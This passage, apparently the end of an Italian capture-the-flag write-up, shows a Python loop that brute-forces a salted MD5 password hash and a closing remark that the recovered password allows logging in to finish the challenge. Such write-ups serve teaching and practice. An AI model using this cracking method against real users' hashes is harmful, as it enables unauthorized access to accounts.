        # Calcola md5(password + salt)
        if hashlib.md5((password + salt).encode()).hexdigest() == target_hash:
            print(f"[+] Password trovata: {password}")
            break
```

Una volta trovata la password, possiamo effettuare il login e completare la sfida.

---
